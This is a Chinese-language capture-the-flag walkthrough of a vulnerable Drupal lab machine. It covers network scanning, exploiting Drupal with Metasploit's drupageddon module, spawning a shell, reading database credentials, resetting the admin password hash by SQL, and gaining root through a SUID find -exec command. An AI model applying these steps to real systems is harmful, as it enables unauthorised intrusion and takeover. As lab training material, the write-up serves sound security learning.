# 信息收集

### 1.主机发现

    
    
    arp-scan -l

![1666169611_634fbb0b939cbf60e39d8.png!small?1666169611303](https://image.3001.net/images/20221019/1666169611_634fbb0b939cbf60e39d8.png!small?1666169611303)

### 2.端口探测

    
    
    nmap -T4 -A -v 192.168.1.108

![1666169624_634fbb18b6cc121d45122.png!small?1666169624744](https://image.3001.net/images/20221019/1666169624_634fbb18b6cc121d45122.png!small?1666169624744)

### 3.CMS

![1666169635_634fbb23541e08f8a62a6.png!small?1666169635082](https://image.3001.net/images/20221019/1666169635_634fbb23541e08f8a62a6.png!small?1666169635082)

### 4.目录扫描

    
    
    dirsearch -u http://192.168.1.108 -i 200 301

![1666169648_634fbb302f2d6d6fee815.png!small?1666169648143](https://image.3001.net/images/20221019/1666169648_634fbb302f2d6d6fee815.png!small?1666169648143)

# 渗透过程

### 访问网站

![1666169663_634fbb3f61a5182aa3c17.png!small?1666169663170](https://image.3001.net/images/20221019/1666169663_634fbb3f61a5182aa3c17.png!small?1666169663170)

创建用户没成功

### 访问扫出的目录

    
    
    http://192.168.1.108/xmlrpc.php   发现XML-RPCy

![1666169678_634fbb4ebce0c11fca245.png!small?1666169678408](https://image.3001.net/images/20221019/1666169678_634fbb4ebce0c11fca245.png!small?1666169678408)

抓包查看系统允许的方法，没有发现可以利用的系统方法。

![1666169693_634fbb5d8ef109640a65f.png!small?1666169693876](https://image.3001.net/images/20221019/1666169693_634fbb5d8ef109640a65f.png!small?1666169693876)

    
    
    http://192.168.1.108/web.config   发现一些页面

![1666169705_634fbb6967ac91ca1661a.png!small?1666169705204](https://image.3001.net/images/20221019/1666169705_634fbb6967ac91ca1661a.png!small?1666169705204)

    
    
    http://192.168.1.108/robots.txt

![1666169716_634fbb7440269683fa1d7.png!small?1666169716037](https://image.3001.net/images/20221019/1666169716_634fbb7440269683fa1d7.png!small?1666169716037)

### 扫描CMS漏洞

    
    
    msfconsole   

  

![1666169733_634fbb857caedca25cbc3.png!small?1666169733476](https://image.3001.net/images/20221019/1666169733_634fbb857caedca25cbc3.png!small?1666169733476)

经测试这个可以利用：

    
    
    exploit/multi/http/drupal_drupageddon 

![1666169749_634fbb95a0a46d3fea797.png!small?1666169749486](https://image.3001.net/images/20221019/1666169749_634fbb95a0a46d3fea797.png!small?1666169749486)

![1666169757_634fbb9d8c3f449bae3c0.png!small?1666169757351](https://image.3001.net/images/20221019/1666169757_634fbb9d8c3f449bae3c0.png!small?1666169757351)

构造伪终端：

    
    
    python -c "import pty;pty.spawn('/bin/bash')"

![1666169770_634fbbaa79c483b7f1d78.png!small?1666169770166](https://image.3001.net/images/20221019/1666169770_634fbbaa79c483b7f1d78.png!small?1666169770166)

### 找flag

flag1路径：

    
    
    /var/www/flag1.txt

![1666169784_634fbbb890a94ed1d28c2.png!small?1666169784276](https://image.3001.net/images/20221019/1666169784_634fbbb890a94ed1d28c2.png!small?1666169784276)

Every good CMS needs a config file - and so do you.提示看CMS配置文件。

百度drupal配置文件：settings.php，用find命令进行查找。

    
    
    find / -name *settings.php  

![1666169800_634fbbc8b997172942a9c.png!small?1666169800485](https://image.3001.net/images/20221019/1666169800_634fbbc8b997172942a9c.png!small?1666169800485)

查看配置文件settings.php发现数据库用户名、密码dbuser、R0ck3t

![1666169809_634fbbd19791167f5172a.png!small?1666169809319](https://image.3001.net/images/20221019/1666169809_634fbbd19791167f5172a.png!small?1666169809319)

发现flag2:

![1666169819_634fbbdb03d342cf0a66e.png!small?1666169818709](https://image.3001.net/images/20221019/1666169819_634fbbdb03d342cf0a66e.png!small?1666169818709)

尝试进入数据库：

![1666169832_634fbbe87ff9ba5400a81.png!small?1666169832483](https://image.3001.net/images/20221019/1666169832_634fbbe87ff9ba5400a81.png!small?1666169832483)

在drupaldb数据库users表发现用户名、密码。

![1666169842_634fbbf259553ed568481.png!small?1666169842228](https://image.3001.net/images/20221019/1666169842_634fbbf259553ed568481.png!small?1666169842228)

Drupal修改管理员密码方法：

    
    
    php scripts/password-hash.sh 123456  生成hash密码  
    ​  
    123456的hash:$S$Da6JNbMJi8lBEIalAuTSunEJkMOf1AO40Vx2t6ATxfu9gAB1daRi

然后进入数据库对密码进行替换

    
    
    UPDATE users SET pass = '生成的hash密码' WHERE name = 'admin';

![1666169853_634fbbfdbdca17d6709d8.png!small?1666169853569](https://image.3001.net/images/20221019/1666169853_634fbbfdbdca17d6709d8.png!small?1666169853569)

    
    
    UPDATE users SET pass = '$S$Da6JNbMJi8lBEIalAuTSunEJkMOf1AO40Vx2t6ATxfu9gAB1daRi' WHERE name = 'admin';

![1666169874_634fbc125412eb92e9dd8.png!small?1666169875019](https://image.3001.net/images/20221019/1666169874_634fbc125412eb92e9dd8.png!small?1666169875019)

登录admin、123456

ssh登录失败：

![1666169890_634fbc226113f1955c4e1.png!small?1666169890189](https://image.3001.net/images/20221019/1666169890_634fbc226113f1955c4e1.png!small?1666169890189)

![1666169903_634fbc2f1c207ac4e09e6.png!small?1666169902940](https://image.3001.net/images/20221019/1666169903_634fbc2f1c207ac4e09e6.png!small?1666169902940)

flag3:

提示exec命令

![1666169914_634fbc3ad53319f311d23.png!small](https://image.3001.net/images/20221019/1666169914_634fbc3ad53319f311d23.png!small)

查看可用的root命令。

    
    
    find / -perm -u=s -type f 2>/dev/null

![1666169936_634fbc5093b72495dc684.png!small?1666169936560](https://image.3001.net/images/20221019/1666169936_634fbc5093b72495dc684.png!small?1666169936560)

flag4:提示要提升权限

![1666169948_634fbc5cc3f1102147bb2.png!small?1666169948531](https://image.3001.net/images/20221019/1666169948_634fbc5cc3f1102147bb2.png!small?1666169948531)

  

# 提权：

find 提权：

![1666169961_634fbc699fd45dbfab810.png!small?1666169961603](https://image.3001.net/images/20221019/1666169961_634fbc699fd45dbfab810.png!small?1666169961603)

    
    
    在普通用户下进入/tmp目录  
    touch text   
    find  / -name text -exec '/bin/sh' \; 提权命令

![1666169985_634fbc810911c5ad053f8.png!small?1666169984766](https://image.3001.net/images/20221019/1666169985_634fbc810911c5ad053f8.png!small?1666169984766)

# 总结：

  * SUID提权

  * msfconsole 漏扫工具的使用

  * 基本的mysql语句 update

  * durpal 忘记管理员密码修改办法

  * python伪终端

